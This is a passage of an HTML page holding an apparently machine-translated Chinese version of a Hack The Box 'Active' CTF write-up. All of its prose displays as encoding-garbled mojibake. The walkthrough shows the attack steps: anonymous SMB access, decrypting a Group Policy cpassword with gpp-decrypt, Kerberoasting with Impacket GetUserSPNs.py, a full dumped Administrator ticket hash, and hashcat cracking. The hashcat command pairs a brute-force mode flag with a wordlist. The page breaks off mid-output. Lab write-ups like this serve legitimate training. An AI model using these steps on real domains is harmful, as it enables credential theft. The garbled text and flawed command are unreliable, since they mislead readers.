<html>
<head>
<title>HacktheBox â€” Active Writeup</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">HacktheBox â€”æ´»åŠ¨å†™æŠ¥å‘Š</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/active-hack-the-box-ctf-writeup-55682a1272c2?source=collection_archive---------1-----------------------#2018-12-10">https://infosecwriteups.com/active-hack-the-box-ctf-writeup-55682a1272c2?source=collection_archive---------1-----------------------#2018-12-10</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><h1 id="b5af" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">å¿«é€Ÿæ³¨é‡Š:</h1><p id="0a45" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">å› æ­¤ï¼Œæ´»è·ƒçš„é»‘å®¢å·²ç»é€€ä¼‘ï¼Œè¿™æ„å‘³ç€å†™æ–‡ç« æ˜¯å…è®¸çš„ã€‚æˆ‘åœ¨å®‰å…¨æ–¹é¢è¿˜æ˜¯ä¸ªæ–°æ‰‹ï¼Œæˆ‘æƒ³ä¸»åŠ¨å‡ºå‡»ã€‚æœ‰äº†è¿™ä¸ªï¼Œæˆ‘åœ¨å‚åŠ PWKè¯¾ç¨‹ä»¥è·å¾—OSCPè®¤è¯ä¹‹å‰åšå¥½äº†å‡†å¤‡ã€‚è¿™æ˜¯æˆ‘æœ€å–œæ¬¢çš„ç›’å­(è™½ç„¶æˆ‘åªç”¨è¿‡å‡ ä¸ªç›’å­)ï¼Œå› ä¸ºå®ƒæ„Ÿè§‰ä¸åƒCTFã€‚ğŸ‘Š</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi lj"><img src="../Images/3ceb9462b856cecd2845e1ce0c99d6bf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1024/format:webp/0*pr1LYpve5yVTL-i0.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">æ¥æº:<a class="ae lv" href="https://cdn4.iconfinder.com/data/icons/greek-mythological-creatures/500/Greek_monster_2-512.png" rel="noopener ugc nofollow" target="_blank">https://cdn 4 . icon finder . com/data/icons/Greek-mythological-creatures/500/Greek _ monster _ 2-512 . png</a></figcaption></figure><h1 id="2375" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">ä»€ä¹ˆæ˜¯é»‘ç›’å­ï¼Ÿ</h1><p id="302f" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">Hack the boxæ˜¯ä¸€ä¸ªåœ¨çº¿å¹³å°ï¼Œæ‚¨å¯ä»¥åœ¨è¿™é‡Œç»ƒä¹ æ¸—é€æµ‹è¯•æŠ€èƒ½ï¼Œå¹¶ä¸å…¶ä»–æˆå‘˜åˆ†äº«æƒ³æ³•ã€‚ç‚¹å‡»äº†è§£æ›´å¤šå…³äº<a class="ae lv" href="https://www.hackthebox.eu/" rel="noopener ugc nofollow" target="_blank">çš„ä¿¡æ¯ã€‚å¦‚æœä½ å¯¹é»‘å®¢(ä¼¦ç†ä¸Š)æ„Ÿå…´è¶£ï¼Œäº†è§£å®ƒçš„ä¸€ä¸ªæ–¹æ³•æ˜¯é€šè¿‡è¿™ä¸ªç½‘ç«™ã€‚é€šå¸¸ï¼Œæˆ‘ä»¬åœ¨è¿™é‡ŒæŠŠæœºå™¨ç§°ä¸ºâ€œç›’å­â€ã€‚</a></p><p id="f2e1" class="pw-post-body-paragraph kl km iq kn b ko lw kq kr ks lx ku kv kw ly ky kz la lz lc ld le ma lg lh li ij bi translated">è¿™ä¸ªç›’å­åœ¨Windowsä¸Šè¿è¡Œã€‚æˆ‘å‘ç°è¿™ä¸ªç›’å­å¾ˆéš¾(ä½†å¾ˆå€¼å¾—)ï¼Œå› ä¸ºæˆ‘å¯¹Windowsç›’å­çš„ç»éªŒå¾ˆå°‘ï¼Œå› ä¸ºæˆ‘çš„å¤§éƒ¨åˆ†ç»ƒä¹ æ—¶é—´éƒ½èŠ±åœ¨Linuxå‘½ä»¤è¡Œä¸Šã€‚ä½†æ˜¯å¦‚æœä½ æƒ³äº†è§£ä¸€äº›å…³äºWindowsçš„å¾ˆé…·çš„ä¸œè¥¿ï¼Œè¿™ä¸ªç›’å­æ˜¯æœ€åˆé€‚çš„ã€‚</p><h1 id="eaf9" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">è®©æˆ‘ä»¬å¼€å§‹å§ã€‚</h1><p id="45d3" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated"><strong class="kn ir">ä¾¦å¯Ÿ</strong>:æˆ‘ä»¬é¦–å…ˆä»nmapæ‰«æå¼€å§‹ï¼Œæˆ‘ä»¬è°ƒç”¨:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="e6cb" class="mg jo iq mc b gy mh mi l mj mk"><strong class="mc ir">nmap -sV -sC -oA nmap/Active 10.10.10.100</strong></span></pre><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi ml"><img src="../Images/74e8ad8dc2fadc705ce07bd75ba135a5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TL1occufwRR-tzYkLHIcLA.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">nmap</figcaption></figure><p id="b63f" class="pw-post-body-paragraph kl km iq kn b ko lw kq kr ks lx ku kv kw ly ky kz la lz lc ld le ma lg lh li ij bi translated"><strong class="kn ir">æšä¸¾:</strong>æˆ‘ä»¬çœ‹åˆ°ç«¯å£88å’Œ445æ˜¯å¼€æ”¾çš„ã€‚Kerberos ä½äº88å·ç«¯å£ã€‚åœ¨è°·æ­Œæœç´¢äº†è¿™äº›å¯ç”¨ç«¯å£é€šå¸¸å…³è”çš„ä½ç½®åï¼Œæˆ‘æ„è¯†åˆ°è¿™ä¸ªç›’å­éœ€è¦ä¸€äº›æ´»åŠ¨ç›®å½•çŸ¥è¯†ã€‚</p><p id="a1d4" class="pw-post-body-paragraph kl km iq kn b ko lw kq kr ks lx ku kv kw ly ky kz la lz lc ld le ma lg lh li ij bi translated">å½“æˆ‘çœ‹åˆ°<strong class="kn ir"> SMB </strong>å…±äº«æ—¶ï¼Œæˆ‘ä¼šå¿«é€Ÿå°è¯•è®¿é—®å®ƒä»¬ï¼Œçœ‹çœ‹æˆ‘ä»¬èƒ½ä»é‚£é‡Œå¾—åˆ°ä»€ä¹ˆã€‚æˆ‘ä»¬é€šè¿‡åœ¨â€œæ–‡ä»¶â€åº”ç”¨ç¨‹åºä¸­çš„â€œè¿æ¥åˆ°æœåŠ¡å™¨â€å­—æ®µä¸­é”®å…¥ä»¥ä¸‹å†…å®¹æ¥è®¿é—®å…±äº«ã€‚</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="f89e" class="mg jo iq mc b gy mh mi l mj mk"><strong class="mc ir">smb ://10.10.10.100</strong> </span></pre><p id="8961" class="pw-post-body-paragraph kl km iq kn b ko lw kq kr ks lx ku kv kw ly ky kz la lz lc ld le ma lg lh li ij bi translated">çœ‹åˆ°è¿™äº›åˆ†äº«åï¼Œæˆ‘å°è¯•åŒ¿åç™»å½•<strong class="kn ir"/>ï¼Œå› ä¸ºæˆ‘è¿˜æ²¡æœ‰ä»»ä½•å‡­è¯ã€‚ç»è¿‡ä¸€äº›å°è¯•å’Œé”™è¯¯ä¹‹åï¼Œæˆ‘èƒ½å¤Ÿä»¥åŒ¿åç”¨æˆ·çš„èº«ä»½ç™»å½•å¤åˆ¶æ–‡ä»¶å¤¹ã€‚</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi mq"><img src="../Images/b3884a67c5aea46b2b550ed9eedc4296.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9CJzcPGWXQQXFhSrn0Ib8w.png"/></div></div></figure><p id="e28e" class="pw-post-body-paragraph kl km iq kn b ko lw kq kr ks lx ku kv kw ly ky kz la lz lc ld le ma lg lh li ij bi translated"><strong class="kn ir">æˆ‘ä»¬å¯¼èˆª:</strong></p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="c9f2" class="mg jo iq mc b gy mh mi l mj mk"><strong class="mc ir">active.htb -&gt; Policies -&gt; {31B2F340â€¦} -&gt; MACHINE -&gt; Preferences -&gt; Groups -&gt; Groups.xml</strong></span></pre><p id="8e56" class="pw-post-body-paragraph kl km iq kn b ko lw kq kr ks lx ku kv kw ly ky kz la lz lc ld le ma lg lh li ij bi translated">æˆ‘ä»¬æ‰¾åˆ°äº†<strong class="kn ir"> Groups.xml </strong>æ–‡ä»¶</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi mr"><img src="../Images/575fd32cc3583beb3f399cd383d8e154.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iY3BmAKtP9f3Y3zpdS2Cpg.png"/></div></div></figure><p id="f6b3" class="pw-post-body-paragraph kl km iq kn b ko lw kq kr ks lx ku kv kw ly ky kz la lz lc ld le ma lg lh li ij bi translated">æ‰“å¼€<strong class="kn ir"> Groups.xml </strong>ï¼Œæˆ‘ä»¬çœ‹åˆ°ä»¥ä¸‹è¯¦ç»†ä¿¡æ¯:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="815e" class="mg jo iq mc b gy mh mi l mj mk">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span><span id="00a1" class="mg jo iq mc b gy ms mi l mj mk">&lt;Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"&gt;&lt;User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" <strong class="mc ir"><em class="mt">name="active.htb\SVC_TGS"</em></strong> image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"&gt;&lt;Properties action="U" newName="" fullName="" description="" <strong class="mc ir"><em class="mt">cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"</em></strong> changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/&gt;&lt;/User&gt;</span><span id="19e6" class="mg jo iq mc b gy ms mi l mj mk">&lt;/Groups&gt;</span></pre><h2 id="c3c9" class="mg jo iq bd jp mu mv dn jt mw mx dp jx kw my mz kb la na nb kf le nc nd kj ne bi translated">æˆ‘ä»¬æ‰¾åˆ°ç”¨æˆ·<strong class="ak">â€œSVC _ TGSâ€</strong>å’Œä¸€ä¸ªå«åš<strong class="ak">â€œcpasswordâ€</strong>çš„æœ‰è¶£å­—æ®µã€‚ğŸ‘Œ</h2><p id="39ee" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">åœ¨è°·æ­Œæœç´¢äº†æ–‡ä»¶å<strong class="kn ir"> Groups.xml </strong>å’Œ<strong class="kn ir"> cpassword </strong>ä¹‹åï¼Œæˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªæ¼æ´ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥<strong class="kn ir">è§£å¯†</strong>å¯†ç ï¼Œå› ä¸ºå¾®è½¯å…¬å¸ƒäº†åŠ å¯†çš„<strong class="kn ir"> AESç§é’¥</strong>ã€‚è¿™æ˜¯åœ¨2012å¹´å·¦å³ã€‚</p><p id="e402" class="pw-post-body-paragraph kl km iq kn b ko lw kq kr ks lx ku kv kw ly ky kz la lz lc ld le ma lg lh li ij bi translated">Kaliä¸­çš„ä¸€ä¸ªåä¸º<strong class="kn ir"> gpp-decrpyt </strong>çš„å·¥å…·å…è®¸æˆ‘ä½¿ç”¨ä¸€è¡Œä»£ç æ¥è§£å¯†ï¼Œå¹¶å‘ç°ç”¨æˆ·<strong class="kn ir">â€œSVC _ TGSâ€</strong>çš„å¯†ç æ˜¯<strong class="kn ir"> GPPstillStandingStrong2k18ã€‚</strong></p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="affd" class="mg jo iq mc b gy mh mi l mj mk"><strong class="mc ir">root@kali</strong>:~/Documents/htb/boxes/Active#gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</span><span id="f348" class="mg jo iq mc b gy ms mi l mj mk">/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated<br/><strong class="mc ir">GPPstillStandingStrong2k18</strong></span></pre><p id="2b6d" class="pw-post-body-paragraph kl km iq kn b ko lw kq kr ks lx ku kv kw ly ky kz la lz lc ld le ma lg lh li ij bi translated">ç„¶åï¼Œæˆ‘ä»¬å°è¯•ä½¿ç”¨è¿™äº›å‡­æ®æ£€æŸ¥å¯ä»¥ç™»å½•çš„ä½ç½®ã€‚å› ä¸ºæˆ‘ä»¬æœ‰ä¸€ä¸ªåä¸º<strong class="kn ir">â€œUsersâ€</strong>çš„å…±äº«ï¼Œæ‰€ä»¥æˆ‘ä»¬é¦–å…ˆå°è¯•è®¿é—®å®ƒã€‚é€šè¿‡å¯¼èˆªï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°<strong class="kn ir"> user.txt </strong>:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="57b9" class="mg jo iq mc b gy mh mi l mj mk"><strong class="mc ir">SVC_TGS-&gt; Desktop -&gt; user.txt</strong></span></pre><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi nf"><img src="../Images/d0f4ea7def420e3bf6f53bb5397d3a7a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eZx2dFNrGvjTiwS6lRoT0A.png"/></div></div></figure><p id="8c5c" class="pw-post-body-paragraph kl km iq kn b ko lw kq kr ks lx ku kv kw ly ky kz la lz lc ld le ma lg lh li ij bi translated"><strong class="kn ir">æƒé™æå‡:</strong>ç°åœ¨æˆ‘ä»¬çš„ç›®æ ‡æ˜¯è·å¾—rootã€‚åœ¨è®ºå›ä¸Šå‘†äº†ä¸€æ®µæ—¶é—´åï¼Œæˆ‘å‘ç°ä¸ºäº†è·å¾—rootï¼Œæˆ‘ä»¬éœ€è¦è¿›è¡Œä¸€æ¬¡åä¸º<strong class="kn ir">â€œKerberosè®¤è¯â€çš„æ”»å‡»ã€‚</strong></p><h1 id="fc6a" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated"><strong class="ak">ä»€ä¹ˆæ˜¯Kerberoastingè®¤è¯ï¼Ÿ</strong></h1><p id="8daa" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">åœ¨ç†è§£Kerberoastä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦ç†è§£Kerberosã€‚åŸºæœ¬ä¸Šï¼Œ<strong class="kn ir"> Kerberos </strong>æ˜¯<strong class="kn ir"> WindowsåŸŸ</strong>çš„è®¤è¯ç³»ç»Ÿã€‚å®ƒæ˜¯ç”±è’‚å§†Â·æ¢…ä¸åœ¨2014å¹´<strong class="kn ir"> SANS Hackfestä¸Šå±•ç¤ºçš„ã€‚Kerberosä¹Ÿæ˜¯å®ˆå«å†¥ç•Œå¤§é—¨çš„ä¸‰å¤´ç‹—ã€‚ç³»ç»Ÿçš„åˆé€‚åç§°ğŸ˜</strong></p><p id="1380" class="pw-post-body-paragraph kl km iq kn b ko lw kq kr ks lx ku kv kw ly ky kz la lz lc ld le ma lg lh li ij bi translated">æˆ‘èŠ±äº†å¾ˆå¤šæ—¶é—´åœ¨rootä¸Šï¼Œå› ä¸ºæˆ‘ä¸èƒ½ç†è§£Kerberosçš„æƒ³æ³•ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘åœ¨è¿™æ®µæ—¶é—´è½¬ç§»åˆ°å…¶ä»–ç›’å­ä¸Šã€‚ğŸ˜…</p><p id="4562" class="pw-post-body-paragraph kl km iq kn b ko lw kq kr ks lx ku kv kw ly ky kz la lz lc ld le ma lg lh li ij bi translated">ç¦»å¼€è¿™ä¸ªç›’å­ä¸€æ®µæ—¶é—´åï¼Œæˆ‘å†³å®šæ‰æ ¹è¿™ä¸ªç›’å­ï¼Œå¼ºè¿«è‡ªå·±å­¦ä¹ Kerberosã€‚æˆ‘æ¨èè¿™äº›å‚è€ƒèµ„æ–™ï¼Œå› ä¸ºå®ƒä»¬å¯¹æˆ‘å¾ˆæœ‰å¸®åŠ©ã€‚</p><div class="ng nh gp gr ni nj"><a href="https://www.roguelynn.com/words/explain-like-im-5-kerberos/" rel="noopener  ugc nofollow" target="_blank"><div class="nk ab fo"><div class="nl ab nm cl cj nn"><h2 class="bd ir gy z fp no fr fs np fu fw ip bi translated">åƒæˆ‘5å²ä¸€æ ·è§£é‡Š:Kerberos</h2><div class="nq l"><h3 class="bd b gy z fp no fr fs np fu fw dk translated">åƒæˆ‘5å²æ—¶ä¸€æ ·è§£é‡Š:Kerberos-Kerberosæ˜¯ä»€ä¹ˆï¼Œæˆ‘ä¸ºä»€ä¹ˆè¦å…³å¿ƒå®ƒï¼Ÿè™½ç„¶è¿™ä¸ªè¯é¢˜å¯èƒ½ä¸èƒ½â€¦</h3></div><div class="nr l"><p class="bd b dl z fp no fr fs np fu fw dk translated">www.roguelynn.com</p></div></div><div class="ns l"><div class="nt l nu nv nw ns nx lp nj"/></div></div></a></div><figure class="lk ll lm ln gt lo"><div class="bz fp l di"><div class="ny nz l"/></div></figure><p id="bc0a" class="pw-post-body-paragraph kl km iq kn b ko lw kq kr ks lx ku kv kw ly ky kz la lz lc ld le ma lg lh li ij bi translated">ä»¥åŠä¸Šé¢ç”¨çš„å¹»ç¯ç‰‡çš„PDFå¤å°ä»¶:<a class="ae lv" href="https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf" rel="noopener ugc nofollow" target="_blank"><strong class="kn ir">https://www . sans . org/cyber-security-summit/archives/file/summit-archive-1493862736 . PDF</strong></a></p><h1 id="aee3" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated"><strong class="ak">è·å–æ ¹:</strong></h1><p id="b0d6" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">åœ¨äº†è§£äº†åŸºç¡€çŸ¥è¯†ä¹‹åï¼Œæˆ‘ç°åœ¨å¼€å§‹æœç´¢å¦‚ä½•åˆ©ç”¨è¿™ä¸ªæ¼æ´çš„å·¥å…·å’ŒæŒ‡å—ã€‚</p><p id="3ffb" class="pw-post-body-paragraph kl km iq kn b ko lw kq kr ks lx ku kv kw ly ky kz la lz lc ld le ma lg lh li ij bi translated">å¶ç„¶å‘ç°äº†Tim Medinçš„<a class="ae lv" href="https://github.com/nidem/kerberoast" rel="noopener ugc nofollow" target="_blank"><strong class="kn ir">Kerberos</strong></a><strong class="kn ir">åº“ï¼Œè¿™æ˜¯ä¸€ç³»åˆ—æ”»å‡»MS Kerberoså®ç°çš„å·¥å…·ã€‚</strong></p><p id="99a9" class="pw-post-body-paragraph kl km iq kn b ko lw kq kr ks lx ku kv kw ly ky kz la lz lc ld le ma lg lh li ij bi translated">æˆ‘è¿˜é‡åˆ°äº†<a class="ae lv" href="https://github.com/SecureAuthCorp/impacket" rel="noopener ugc nofollow" target="_blank"><strong class="kn ir">Impacket</strong></a><strong class="kn ir">ï¼Œè¿™æ˜¯ä¸€ä¸ªç”¨äºå¤„ç†ç½‘ç»œåè®®çš„Pythonç±»é›†åˆã€‚</strong></p><p id="178e" class="pw-post-body-paragraph kl km iq kn b ko lw kq kr ks lx ku kv kw ly ky kz la lz lc ld le ma lg lh li ij bi translated">ä½ å¯ä»¥ä½¿ç”¨Powershellè¿›è¡ŒKerberoastï¼Œä½†æ˜¯æˆ‘ä½¿ç”¨äº†æ¥è‡ªT4 Impacketé›†åˆçš„T2 getuserspns . pyã€‚æˆ‘ä»¬è°ƒç”¨å‘½ä»¤:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="c910" class="mg jo iq mc b gy mh mi l mj mk"><strong class="mc ir">root@kali:/opt/impacket/examples# ./GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS</strong></span></pre><p id="0133" class="pw-post-body-paragraph kl km iq kn b ko lw kq kr ks lx ku kv kw ly ky kz la lz lc ld le ma lg lh li ij bi translated">è¯¥å‘½ä»¤åˆ—å‡ºäº†æ‰€æœ‰çš„<strong class="kn ir"> SPNçš„</strong>ã€‚</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi oa"><img src="../Images/b96ab26f8be1afc83fc98d5cceb18864.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DvBjXNYtOcEYspEU8O4hDQ.png"/></div></div></figure><p id="edf0" class="pw-post-body-paragraph kl km iq kn b ko lw kq kr ks lx ku kv kw ly ky kz la lz lc ld le ma lg lh li ij bi translated">æˆ‘ä»¬çœ‹åˆ°äº†<strong class="kn ir">ç®¡ç†å‘˜</strong>ç”¨æˆ·ã€‚</p><p id="735f" class="pw-post-body-paragraph kl km iq kn b ko lw kq kr ks lx ku kv kw ly ky kz la lz lc ld le ma lg lh li ij bi translated">ç„¶åï¼Œæˆ‘ä»¬é€šè¿‡è°ƒç”¨ç›¸åŒçš„å‘½ä»¤è¯·æ±‚åˆ—å‡ºçš„<strong class="kn ir"> SPNçš„</strong>çš„<strong class="kn ir"> Kerberosç¥¨è¯</strong>ï¼Œä½†æ˜¯æ·»åŠ äº†ä¸€ä¸ª<strong class="kn ir"> -request </strong>é€‰é¡¹:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="64f3" class="mg jo iq mc b gy mh mi l mj mk"><strong class="mc ir">root@kali:/opt/impacket/examples# ./GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS -request</strong></span></pre><p id="a124" class="pw-post-body-paragraph kl km iq kn b ko lw kq kr ks lx ku kv kw ly ky kz la lz lc ld le ma lg lh li ij bi translated">å¹¶æ˜¾ç¤ºä»¥ä¸‹è¾“å‡º:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="025e" class="mg jo iq mc b gy mh mi l mj mk"><strong class="mc ir">$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$1a82fe759bb31cfb4cf6239d0174846a$33cf8e7f4ffc07b1e474d897089ad8c436f119df0519ed43f7e654869415f244a826a4fefad7d98a0ac7fc09b59a8ded1c3c2388b9fb37826a3f08ce673a3f757252e9150f4d6630b2f8a29e1ed235d165b6141c25739c83b1b46b2f548b213e750f50ca9ab5a7605a78b3fcfc7d57ff76e7ef9461b2c67de4d5a213e602fb7c83f4e346eda1757705d0b545dcd8a1f2ca2210dd508d3de2ec338efa2c354bca8a8eee54548453dc64c041f9a4529e7a829b0d81da41c1867dff2e91653bc88015989330dd5fbcf9f2620addeb5e0e6dd69a6647e535793d65865d1504a82be9f46e46e96d6647e5533a6d5baa2c35971ed54e1ff4c5c83636dd691b9b29f8e5fe6e20e68a92a9e53e0e9671b5725841ab1f7b50dbba6a5605458d22a5d5cbd802ce01e39cd9264d98d8e4690fc6acff183f6d28a490a4e3fdce3af76a01c5ea8ddee062a7879c7da831aa296dd799b5c2b7c4dd8ded634596f40967a0ab5c5073e0259fc7a8468431a9a320b7d58d8e148812af89785f7ebefbbaffeb6450229a9423fd8c32fbc86f8f0a3d62fe52ce29d72dbaaaa1f918adea059895e5b44713d06831488e568eb4a3153b68d7016b065e67dc30306f03f4022dc90d50e871b115affa330d586bd5465b4ebc8cb36f17ef1ddd28d477e268c0a1ba142edc49c8c1218050510bd556e84e9f6982527e4163444419ffc132f9f7f0405eef831e1b82f84ab8b0bea00fc3356a25393ab5747cab540389bc0014f581f1d2ae0ef04d82b47c7e2d1db92239820a4bfc5d514be42770a1a9d4eed464d1504bcfe82d1edf36cfcee95590f3ab220b8ece07d80920ad906aed907f123deee391488ac7ee48356d47419aeb3cf2415906ef57fd83732cef7d1ed20ac82ca7a277f44ee9c2ecd460f6c35d70a834541379bec01c2a28846ce03046be2f075bc2d3f7d15745aae334c9a2a665bc3a3c093cae3f0eb8e35cda9b4b70b0a180a71c826fb17ef923719d5ecc0ba8c75cad4150b65c797789c8c98450058266ba66d58ab0a1664a09eb2d2ac21c7ab2e9f64cf2b92680af994386ac48c1496657ab172b1376715c1b86f20e1dc42f9eeb8ec79033bfc10a3ac0a11dc7d7ede8f51c366e29e4969e829043f9454b8cce64445fe5c8eb3498acf17c8ccf608757832e2fc2dc2046974536af533417b0ed62be3cd9195139ecd945a8dafaab636755cf4008ebea06531b822f4634f343c615444da3aca0fd9337fbab70437584a11c</strong></span></pre><p id="1527" class="pw-post-body-paragraph kl km iq kn b ko lw kq kr ks lx ku kv kw ly ky kz la lz lc ld le ma lg lh li ij bi translated"><strong class="kn ir"> GetUSerSPNs.py </strong>è¾“å‡ºä¸<strong class="kn ir"> hashcat </strong>å…¼å®¹çš„æ–‡ä»¶ã€‚</p><h2 id="8107" class="mg jo iq bd jp mu mv dn jt mw mx dp jx kw my mz kb la na nb kf le nc nd kj ne bi translated">Hashcatæ˜¯ä¸€ä¸ªå¯†ç æ¢å¤å·¥å…·ã€‚ä½ å¯ä»¥é€šè¿‡ä½¿ç”¨oclHashcatæ¥ä½¿ç”¨ä½ çš„CPUæˆ–è€…GPUğŸ˜„</h2><p id="831b" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">ä½¿ç”¨hashcatæ¥æ¢å¤å¯†ç ï¼Œæˆ‘ä»¬è°ƒç”¨å‘½ä»¤:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="6f4d" class="mg jo iq mc b gy mh mi l mj mk"><strong class="mc ir">hashcat -a 3 -m 13100 ~/Documents/htb/boxes/Active/ticket.txt /usr/share/wordlists/rockyou.txt --force</strong></span></pre><p id="00dc" class="pw-post-body-paragraph kl km iq kn b ko lw kq kr ks lx ku kv kw ly ky kz la lz lc ld le ma lg lh li ij bi translated"><em class="mt">å…¶ä¸­:</em></p><ul class=""><li id="0a83" class="ob oc iq kn b ko lw ks lx kw od la oe le of li og oh oi oj bi translated">-a =æ¨¡å¼ï¼Œå…¶ä¸­3è¡¨ç¤ºè›®åŠ›</li><li id="b267" class="ob oc iq kn b ko ok ks ol kw om la on le oo li og oh oi oj bi translated">-m =å“ˆå¸Œæ¨¡å¼ï¼Œå…¶ä¸­13100æ˜¯Kerberos 5 TGS-REP etype 23</li><li id="b335" class="ob oc iq kn b ko ok ks ol kw om la on le oo li og oh oi oj bi translated">~/Documents/htb/boxes/Active/ticket . txt = getuserspns . pyçš„è¾“å‡º</li><li id="d424" class="ob oc iq kn b ko ok ks ol kw om la on le oo li og oh oi oj bi translated">/usr/share/wordlists/rock you . txt =ç”¨äºç ´è§£çš„word list</li></ul><p id="3202" class="pw-post-body-paragraph kl km iq kn b ko lw kq kr ks lx ku kv kw ly ky kz la lz lc ld le ma lg lh li ij bi translated">ç ´è§£å¯†ç åï¼Œæˆ‘ä»¬è¿è¡Œç›¸åŒçš„å‘½ä»¤ï¼Œå¹¶åœ¨æœ«å°¾æ·»åŠ ä¸€ä¸ªâ€œåŒè™šçº¿æ˜¾ç¤ºâ€,ä»¥æŸ¥çœ‹é™„åŠ åœ¨æœ«å°¾çš„æ¢å¤å¯†ç :</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="8fc7" class="mg jo iq mc b gy mh mi l mj mk"><strong class="mc ir">hashcat -a 3 -m 13100 ~/Documents/htb/boxes/Active/ticket.txt /usr/share/wordlists/rockyou.txt --force --show</strong></span></pre><p id="c29a" class="pw-post-body-paragraph kl km iq kn b ko lw kq kr ks lx ku kv kw ly ky kz la lz lc ld le ma lg lh li ij bi translated">è¾“å‡ºæ˜¯</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="4e08" class="mg jo iq mc b gy mh mi l mj 